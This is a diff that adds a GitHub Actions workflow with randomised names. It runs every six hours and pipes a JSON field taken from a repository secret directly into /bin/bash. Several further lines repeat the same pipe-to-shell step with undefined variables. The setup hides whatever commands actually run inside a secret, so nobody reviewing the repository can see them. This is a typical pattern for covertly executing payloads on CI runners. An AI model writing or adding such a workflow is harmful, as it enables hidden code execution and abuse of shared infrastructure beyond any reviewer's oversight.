@@ -1,0 +1,24 @@
+name: chengyuepengdi
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '49 5/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: chengyuepengdi
+        env:
+          hxdae08883: ${{ secrets.hxdae08883 }}
+        run: |
+          echo $hxdae08883 | jq -r .gj76279 | /bin/bash
+          echo $sbdo51 | jq -r .fadpe333 | /bin/bash
+          echo $r24 | jq -r .cpn1 | /bin/bash
+          echo $gbm75990 | jq -r .aiq3934 | /bin/bash
+          echo $hax899 | jq -r .tdox982 | /bin/bash
+          echo $zcug6732 | jq -r .vs6 | /bin/bash
+          echo $uwvqp69179 | jq -r .w52 | /bin/bash
+          echo $uhn36 | jq -r .scrin64 | /bin/bash
+
